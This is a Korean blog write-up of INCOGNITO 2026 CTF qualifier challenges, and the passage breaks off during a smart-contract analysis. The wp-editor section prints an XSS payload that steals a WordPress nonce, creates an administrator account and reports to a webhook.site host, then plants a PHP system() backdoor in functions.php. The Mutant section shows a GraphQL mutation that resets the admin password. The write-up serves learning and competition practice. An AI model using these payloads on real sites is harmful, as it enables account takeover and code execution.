---
title: "INC0GNITO 2026 CTF Quals"
date: 2026-02-07
description: "INC0GNITO 2026 CTF Quals의 wp-editor 웹 문제 풀이 과정을 정리합니다."
tags:
  - "대외활동"
---

<h2 data-ke-size="size26">wp-editor</h2>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1884" data-origin-height="489"><span data-url="https://blog.kakaocdn.net/dn/GTmnm/dJMcacaW4IQ/t3AxyWq5bDeKhFQsVL0Q7k/img.png" data-phocus="https://blog.kakaocdn.net/dn/GTmnm/dJMcacaW4IQ/t3AxyWq5bDeKhFQsVL0Q7k/img.png"><img src="https://blog.kakaocdn.net/dn/GTmnm/dJMcacaW4IQ/t3AxyWq5bDeKhFQsVL0Q7k/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FGTmnm%2FdJMcacaW4IQ%2Ft3AxyWq5bDeKhFQsVL0Q7k%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1884" height="489" data-origin-width="1884" data-origin-height="489"/></span></figure>
</p>
<p data-ke-size="size16">web 문제였다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">먼저 문제에서 제공된 bot.py를 분석하면</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1237" data-origin-height="286"><span data-url="https://blog.kakaocdn.net/dn/4lgnt/dJMcadHDkId/USo52GodYA1xEPYW69f74k/img.png" data-phocus="https://blog.kakaocdn.net/dn/4lgnt/dJMcadHDkId/USo52GodYA1xEPYW69f74k/img.png"><img src="https://blog.kakaocdn.net/dn/4lgnt/dJMcadHDkId/USo52GodYA1xEPYW69f74k/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F4lgnt%2FdJMcadHDkId%2FUSo52GodYA1xEPYW69f74k%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1237" height="286" data-origin-width="1237" data-origin-height="286"/></span></figure>
</p>
<p data-ke-size="size16">봇은 게시글 post_content에서 태그를 찾는다. 이때 링크 주소에 wp-content/uploads가 포함되어 있고, 확장자가 .html로 끝나는 경우에만 Selenium으로 방문한다.</p>
<p data-ke-size="size16">다음으로 setup-wordpress를 보면</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="728" data-origin-height="62"><span data-url="https://blog.kakaocdn.net/dn/I8U2x/dJMcachHS07/ptbWF2jlNgsvY4lgE0XSJK/img.png" data-phocus="https://blog.kakaocdn.net/dn/I8U2x/dJMcachHS07/ptbWF2jlNgsvY4lgE0XSJK/img.png"><img src="https://blog.kakaocdn.net/dn/I8U2x/dJMcachHS07/ptbWF2jlNgsvY4lgE0XSJK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FI8U2x%2FdJMcachHS07%2FptbWF2jlNgsvY4lgE0XSJK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="728" height="62" data-origin-width="728" data-origin-height="62"/></span></figure>
</p>
<p data-ke-size="size16">WP_HTTP_BLOCK_EXTERNAL 상수가 true로 설정되어 있다.</p>
<p data-ke-size="size16">따라서 PHP로 플래그를 읽어 웹훅으로 보내는 것은 불가능하다고 판단된다.</p>
<p data-ke-size="size16">다음으로 Dockerfile를 보면</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="386" data-origin-height="48"><span data-url="https://blog.kakaocdn.net/dn/bT3ND7/dJMcahi2eYN/0xbB6dcw6QkRoXA8CfJE50/img.png" data-phocus="https://blog.kakaocdn.net/dn/bT3ND7/dJMcahi2eYN/0xbB6dcw6QkRoXA8CfJE50/img.png"><img src="https://blog.kakaocdn.net/dn/bT3ND7/dJMcahi2eYN/0xbB6dcw6QkRoXA8CfJE50/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbT3ND7%2FdJMcahi2eYN%2F0xbB6dcw6QkRoXA8CfJE50%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="386" height="48" data-origin-width="386" data-origin-height="48"/></span></figure>
</p>
<p data-ke-size="size16">플래그 경로를 확인 가능하다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">먼저 AI를 활용해 아래와 같은 스크립트를 작성했다.</p>
<pre class="cs"><code>&lt;script&gt;
    const webhook = "https://webhook.site/XXXX";

    function log(msg) {
        new Image().src = webhook + "?log=" + encodeURIComponent(msg);
    }

    async function pwn() {
        try {
            log("1. Exploit Started: Attempting to create Admin user");

            const res = await fetch('/wp-admin/user-new.php');
            const html = await res.text();

            const parser = new DOMParser();
            const doc = parser.parseFromString(html, "text/html");

            const nonceEl = doc.getElementById('_wpnonce_create-user');

            if (!nonceEl) {
                const title = doc.querySelector('title').innerText;
                log("Failure: Nonce not found. Current Page: " + title);
                return;
            }

            const nonce = nonceEl.value;
            log("2. Nonce Found: " + nonce);

            const params = new URLSearchParams();
            params.append('action', 'createuser');
            params.append('_wpnonce_create-user', nonce);
            params.append('_wp_http_referer', '/wp-admin/user-new.php');
            params.append('user_login', 'hacker');
            params.append('email', 'hacker@example.com');
            params.append('first_name', 'Hacker');
            params.append('last_name', 'Admin');
            params.append('pass1', 'hacker123!@#');
            params.append('pass2', 'hacker123!@#');
            params.append('role', 'administrator'); 
            params.append('createuser', 'Add New User');

            await fetch('/wp-admin/user-new.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: params
            });

            log("Success! User 'hacker' created. Try logging in now.");

        } catch (e) {
            log("Error: " + e.message);
        }
    }
    pwn();
&lt;/script&gt;</code></pre>
<p data-ke-size="size16">봇이 /wp-admin/user-new.php에 접속하게 하여 Nonce(보안 토큰)를 추출하게하고,</p>
<p data-ke-size="size16">추출한 Nonce를 이용해 hacker라는 ID의 관리자 계정을 생성한다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">이제 주어진 계정으로 로그인을 하고</p>
<p><figure class="imageblock alignLeft" data-ke-mobileStyle="widthOrigin" data-origin-width="899" data-origin-height="1050"><span data-url="https://blog.kakaocdn.net/dn/c5UF1F/dJMcafFuMkv/8iYOX9KKbjJZpOUvV1MGsK/img.png" data-phocus="https://blog.kakaocdn.net/dn/c5UF1F/dJMcafFuMkv/8iYOX9KKbjJZpOUvV1MGsK/img.png"><img src="https://blog.kakaocdn.net/dn/c5UF1F/dJMcafFuMkv/8iYOX9KKbjJZpOUvV1MGsK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fc5UF1F%2FdJMcafFuMkv%2F8iYOX9KKbjJZpOUvV1MGsK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="372" height="434" data-origin-width="899" data-origin-height="1050"/></span></figure>
</p>
<p data-ke-size="size16">미디어에 해당 파일을 업로드 후, 파일 링크를 복사해둔다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="2756" data-origin-height="1206"><span data-url="https://blog.kakaocdn.net/dn/zKF6w/dJMcah4nKdm/bKpo7urx6L2jmH9jpDDJK0/img.png" data-phocus="https://blog.kakaocdn.net/dn/zKF6w/dJMcah4nKdm/bKpo7urx6L2jmH9jpDDJK0/img.png"><img src="https://blog.kakaocdn.net/dn/zKF6w/dJMcah4nKdm/bKpo7urx6L2jmH9jpDDJK0/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzKF6w%2FdJMcah4nKdm%2FbKpo7urx6L2jmH9jpDDJK0%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="2756" height="1206" data-origin-width="2756" data-origin-height="1206"/></span></figure>
</p>
<p data-ke-size="size16">게시글에 링크를 아래와 같이 삽입 후 기다리면 봇이 방문한다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1308" data-origin-height="786"><span data-url="https://blog.kakaocdn.net/dn/bOujLq/dJMcabwjupq/hwCwveZJ3D0b2ijGs5jOh1/img.png" data-phocus="https://blog.kakaocdn.net/dn/bOujLq/dJMcabwjupq/hwCwveZJ3D0b2ijGs5jOh1/img.png"><img src="https://blog.kakaocdn.net/dn/bOujLq/dJMcabwjupq/hwCwveZJ3D0b2ijGs5jOh1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbOujLq%2FdJMcabwjupq%2FhwCwveZJ3D0b2ijGs5jOh1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1308" height="786" data-origin-width="1308" data-origin-height="786"/></span></figure>
</p>
<p data-ke-size="size16">나는 이때 봇이 잘 방문헀는지 알려고 스크립트에 웹훅 코드를 넣었었다.</p>
<p data-ke-size="size16">이제 확인해보면</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1138" data-origin-height="180"><span data-url="https://blog.kakaocdn.net/dn/m8O5Q/dJMcaioHlZm/BnIjkkO7kf7RcQEU2WEPck/img.png" data-phocus="https://blog.kakaocdn.net/dn/m8O5Q/dJMcaioHlZm/BnIjkkO7kf7RcQEU2WEPck/img.png"><img src="https://blog.kakaocdn.net/dn/m8O5Q/dJMcaioHlZm/BnIjkkO7kf7RcQEU2WEPck/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fm8O5Q%2FdJMcaioHlZm%2FBnIjkkO7kf7RcQEU2WEPck%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1138" height="180" data-origin-width="1138" data-origin-height="180"/></span></figure>
</p>
<p data-ke-size="size16">봇이 방문한 걸 알 수 있고. 이제 만들어진 hacker계정으로 로그인 하면 관리자 권한으로 접속 성공한다.</p>
<p data-ke-size="size16">이제 File Manager 플러그인을 설치하여 파일 시스템에 직접 접근한다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1221" data-origin-height="692"><span data-url="https://blog.kakaocdn.net/dn/pt8F1/dJMcadt5uWR/DlqexIAu0ntiphCeKZ7Ck1/img.png" data-phocus="https://blog.kakaocdn.net/dn/pt8F1/dJMcadt5uWR/DlqexIAu0ntiphCeKZ7Ck1/img.png"><img src="https://blog.kakaocdn.net/dn/pt8F1/dJMcadt5uWR/DlqexIAu0ntiphCeKZ7Ck1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fpt8F1%2FdJMcadt5uWR%2FDlqexIAu0ntiphCeKZ7Ck1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1221" height="692" data-origin-width="1221" data-origin-height="692"/></span></figure>
</p>
<p data-ke-size="size16">설치 후</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="2489" data-origin-height="1158"><span data-url="https://blog.kakaocdn.net/dn/cIjhDi/dJMcaiPHlAw/ntHq6oFwkxxeA79PXrvuAK/img.png" data-phocus="https://blog.kakaocdn.net/dn/cIjhDi/dJMcaiPHlAw/ntHq6oFwkxxeA79PXrvuAK/img.png"><img src="https://blog.kakaocdn.net/dn/cIjhDi/dJMcaiPHlAw/ntHq6oFwkxxeA79PXrvuAK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcIjhDi%2FdJMcaiPHlAw%2FntHq6oFwkxxeA79PXrvuAK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="2489" height="1158" data-origin-width="2489" data-origin-height="1158"/></span></figure>
</p>
<p data-ke-size="size16">위 경로로 들어가서 functions.php를 수정한다.</p>
<p data-ke-size="size16">수정할때는 아래와 같은 백도어를 최 하단에 삽입한다.</p>
<pre class="isbl"><code>system('cat /flag.php');
die(" &lt;-- FLAG FOUND");</code></pre>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1294" data-origin-height="937"><span data-url="https://blog.kakaocdn.net/dn/b4VJzs/dJMcacPxZDs/h1FSee1rpfbmSxi9Zsk83K/img.png" data-phocus="https://blog.kakaocdn.net/dn/b4VJzs/dJMcacPxZDs/h1FSee1rpfbmSxi9Zsk83K/img.png"><img src="https://blog.kakaocdn.net/dn/b4VJzs/dJMcacPxZDs/h1FSee1rpfbmSxi9Zsk83K/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb4VJzs%2FdJMcacPxZDs%2Fh1FSee1rpfbmSxi9Zsk83K%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1294" height="937" data-origin-width="1294" data-origin-height="937"/></span></figure>
</p>
<p data-ke-size="size16">이제 저장하고 메인 페이지에 접속하면 아래와 같이 Flag가 나온다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1936" data-origin-height="249"><span data-url="https://blog.kakaocdn.net/dn/ckGRfE/dJMcac22zzk/u5s1mUkHrkyV2w6Ds3lyQ1/img.png" data-phocus="https://blog.kakaocdn.net/dn/ckGRfE/dJMcac22zzk/u5s1mUkHrkyV2w6Ds3lyQ1/img.png"><img src="https://blog.kakaocdn.net/dn/ckGRfE/dJMcac22zzk/u5s1mUkHrkyV2w6Ds3lyQ1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FckGRfE%2FdJMcac22zzk%2Fu5s1mUkHrkyV2w6Ds3lyQ1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1936" height="249" data-origin-width="1936" data-origin-height="249"/></span></figure>
</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">Flag: INCOGNITO{I_waNn4_ge7_edi70r_p3rmIs5ion_for_yOur_wp_site}</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style5" />
<h2 data-ke-size="size26">Mutant</h2>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1898" data-origin-height="687"><span data-url="https://blog.kakaocdn.net/dn/b3nmID/dJMcaaKWT5D/RSX2apKAvlGmmAK4Aniyv0/img.png" data-phocus="https://blog.kakaocdn.net/dn/b3nmID/dJMcaaKWT5D/RSX2apKAvlGmmAK4Aniyv0/img.png"><img src="https://blog.kakaocdn.net/dn/b3nmID/dJMcaaKWT5D/RSX2apKAvlGmmAK4Aniyv0/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb3nmID%2FdJMcaaKWT5D%2FRSX2apKAvlGmmAK4Aniyv0%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1898" height="687" data-origin-width="1898" data-origin-height="687"/></span></figure>
</p>
<p data-ke-size="size16">블랙박스 형식의 web문제였다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">먼저 제공된 계정으로 로그인 후 기능을 탐색했다.</p>
<p data-ke-size="size16">/admin을 접근했는데 권한이 없다고 나온다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="2352" data-origin-height="460"><span data-url="https://blog.kakaocdn.net/dn/cjTsYv/dJMcahcd5qp/YhzjGAKmkXgbkcWsXqrbJk/img.png" data-phocus="https://blog.kakaocdn.net/dn/cjTsYv/dJMcahcd5qp/YhzjGAKmkXgbkcWsXqrbJk/img.png"><img src="https://blog.kakaocdn.net/dn/cjTsYv/dJMcahcd5qp/YhzjGAKmkXgbkcWsXqrbJk/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcjTsYv%2FdJMcahcd5qp%2FYhzjGAKmkXgbkcWsXqrbJk%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="2352" height="460" data-origin-width="2352" data-origin-height="460"/></span></figure>
</p>
<p data-ke-size="size16">/mypage는 비밀번호 변경 기능을 지원한다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1660" data-origin-height="610"><span data-url="https://blog.kakaocdn.net/dn/dmHKoM/dJMcai3elko/HHPbPgbIkjvf4kY7vEzpoK/img.png" data-phocus="https://blog.kakaocdn.net/dn/dmHKoM/dJMcai3elko/HHPbPgbIkjvf4kY7vEzpoK/img.png"><img src="https://blog.kakaocdn.net/dn/dmHKoM/dJMcai3elko/HHPbPgbIkjvf4kY7vEzpoK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdmHKoM%2FdJMcai3elko%2FHHPbPgbIkjvf4kY7vEzpoK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1660" height="610" data-origin-width="1660" data-origin-height="610"/></span></figure>
</p>
<p data-ke-size="size16">/products는 상품 검색 기능을 지원한다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1881" data-origin-height="294"><span data-url="https://blog.kakaocdn.net/dn/eBOPz9/dJMcahpMrI6/cqp4m6AFoyKCvIQvsBwph1/img.png" data-phocus="https://blog.kakaocdn.net/dn/eBOPz9/dJMcahpMrI6/cqp4m6AFoyKCvIQvsBwph1/img.png"><img src="https://blog.kakaocdn.net/dn/eBOPz9/dJMcahpMrI6/cqp4m6AFoyKCvIQvsBwph1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FeBOPz9%2FdJMcahpMrI6%2Fcqp4m6AFoyKCvIQvsBwph1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1881" height="294" data-origin-width="1881" data-origin-height="294"/></span></figure>
</p>
<p data-ke-size="size16">여기서 /products 페이지에서 검색을 수행할때의 패킷을 잡는다.</p>
<p><figure class="imageblock alignLeft" data-ke-mobileStyle="widthOrigin" data-origin-width="554" data-origin-height="807"><span data-url="https://blog.kakaocdn.net/dn/ehnPBz/dJMcaac7LX7/LefSG29QeCIkwBcKNtNOY1/img.png" data-phocus="https://blog.kakaocdn.net/dn/ehnPBz/dJMcaac7LX7/LefSG29QeCIkwBcKNtNOY1/img.png"><img src="https://blog.kakaocdn.net/dn/ehnPBz/dJMcaac7LX7/LefSG29QeCIkwBcKNtNOY1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FehnPBz%2FdJMcaac7LX7%2FLefSG29QeCIkwBcKNtNOY1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="554" height="807" data-origin-width="554" data-origin-height="807"/></span></figure>
</p>
<p data-ke-size="size16">GraphQL 쿼리를 사용하고 있는걸 볼 수 있다.</p>
<p data-ke-size="size16">해당 패킷의 바디를 아래처럼 수정해 보내면</p>
<pre class="nsis"><code>{
  "doc": "mutation { changePasswd(input: { username: \"admin\", newPassword: \"hack\" }) { username } }"
}</code></pre>
<p data-ke-size="size16">아래와 같은 응답이 온다.</p>
<p><figure class="imageblock alignLeft" data-ke-mobileStyle="widthOrigin" data-origin-width="547" data-origin-height="778"><span data-url="https://blog.kakaocdn.net/dn/ohhLb/dJMcaaKWT9H/Sy7S2MKeUokxphSb8KTHt1/img.png" data-phocus="https://blog.kakaocdn.net/dn/ohhLb/dJMcaaKWT9H/Sy7S2MKeUokxphSb8KTHt1/img.png"><img src="https://blog.kakaocdn.net/dn/ohhLb/dJMcaaKWT9H/Sy7S2MKeUokxphSb8KTHt1/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FohhLb%2FdJMcaaKWT9H%2FSy7S2MKeUokxphSb8KTHt1%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="547" height="778" data-origin-width="547" data-origin-height="778"/></span></figure>
</p>
<p data-ke-size="size16">이후 기존 계정에서 로그아웃을 하고<br />방금 바꾼 admin의 패스워드인 hack로 로그인을 하면<br />로그인이 정상적으로 되는걸 확인 가능하다.</p>
<p data-ke-size="size16">이제 아까 찾았던 /admin으로 가보면</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1616" data-origin-height="511"><span data-url="https://blog.kakaocdn.net/dn/bHkli3/dJMcaf6yOAR/hlxj40tp094JDOM1F7uvzK/img.png" data-phocus="https://blog.kakaocdn.net/dn/bHkli3/dJMcaf6yOAR/hlxj40tp094JDOM1F7uvzK/img.png"><img src="https://blog.kakaocdn.net/dn/bHkli3/dJMcaf6yOAR/hlxj40tp094JDOM1F7uvzK/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbHkli3%2FdJMcaf6yOAR%2Fhlxj40tp094JDOM1F7uvzK%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1616" height="511" data-origin-width="1616" data-origin-height="511"/></span></figure>
</p>
<p data-ke-size="size16">플래그를 얻을 수 있다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">Flag: INCOGNITO{graph9l_1nj3ction_1s_aw3some}</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">추가로 함수명 찾을때는 /mypage의 비밀번호 변경 패킷을 활용했다.</p>
<p><figure class="imageblock alignLeft" data-ke-mobileStyle="widthOrigin" data-origin-width="549" data-origin-height="114"><span data-url="https://blog.kakaocdn.net/dn/bn1ABn/dJMcaaxqC8B/Eb6ZniBwG4Kz52kEFWoR30/img.png" data-phocus="https://blog.kakaocdn.net/dn/bn1ABn/dJMcaaxqC8B/Eb6ZniBwG4Kz52kEFWoR30/img.png"><img src="https://blog.kakaocdn.net/dn/bn1ABn/dJMcaaxqC8B/Eb6ZniBwG4Kz52kEFWoR30/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbn1ABn%2FdJMcaaxqC8B%2FEb6ZniBwG4Kz52kEFWoR30%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="549" height="114" data-origin-width="549" data-origin-height="114"/></span></figure>
</p>
<p data-ke-size="size16">덕분에 유추하기 수월했다.</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style5" />
<h2 data-ke-size="size26">private</h2>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1880" data-origin-height="579"><span data-url="https://blog.kakaocdn.net/dn/bT1U0V/dJMb99ZBynd/IvJUg2djYetK4dWt2WQ2n0/img.png" data-phocus="https://blog.kakaocdn.net/dn/bT1U0V/dJMb99ZBynd/IvJUg2djYetK4dWt2WQ2n0/img.png"><img src="https://blog.kakaocdn.net/dn/bT1U0V/dJMb99ZBynd/IvJUg2djYetK4dWt2WQ2n0/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbT1U0V%2FdJMb99ZBynd%2FIvJUg2djYetK4dWt2WQ2n0%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1880" height="579" data-origin-width="1880" data-origin-height="579"/></span></figure>
</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style5" />
<p data-ke-size="size16">web3문제였다.</p>
<p><figure class="imageblock widthContent" data-ke-mobileStyle="widthOrigin" data-origin-width="1880" data-origin-height="579"><span data-url="https://blog.kakaocdn.net/dn/cXK9zb/dJMcaiIWRB6/J5KUO7cvASr2pM5EI8MOf0/img.png" data-phocus="https://blog.kakaocdn.net/dn/cXK9zb/dJMcaiIWRB6/J5KUO7cvASr2pM5EI8MOf0/img.png"><img src="https://blog.kakaocdn.net/dn/cXK9zb/dJMcaiIWRB6/J5KUO7cvASr2pM5EI8MOf0/img.png" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcXK9zb%2FdJMcaiIWRB6%2FJ5KUO7cvASr2pM5EI8MOf0%2Fimg.png" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" loading="lazy" width="1880" height="579" data-origin-width="1880" data-origin-height="579"/></span></figure>
</p>
<hr contenteditable="false" data-ke-type="horizontalRule" data-ke-style="style6" />
<p data-ke-size="size16">문제 파일을 받으면 FlagContract.sol를 얻을 수 있는데(이더리움 스마트 컨트랙트 코드) 거기에 아래와 같은 코드가 있다.</p>
<pre class="typescript"><code>// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract FlagContract {
    string private flag = "INCOGNITO{REDACTED}";

    constructor() {
        flag = "YOU_SHALL_NOT_PASS";
    }
    function getFlag() public view returns (string memory) {
        return flag;
    }
}
</code></pre>
<p data-ke-size="size16">이를 분석하면 컨트랙트가 배포될때 일어난 일을 알 수 있다.</p>
<ul style="list-style-type: disc;" data-ke-list-type="disc">
<li>string private flag = "INCOGNITO{REDACTED}" 코드를 통해 컨트랙트 생성 데이터에 진짜 플래그가 포함되어 전송된다.</li>
<li>컨트랙트가 배포되는 즉시 constructor가 실행되어 flag 변수 값을 YOU_SHALL_NOT_PASS로 덮어쓴다.</li>
<li>그 결과 현재 Storage를 조회하거나 getFlag()를 호출하면 가짜 값만 반환한다.</li>
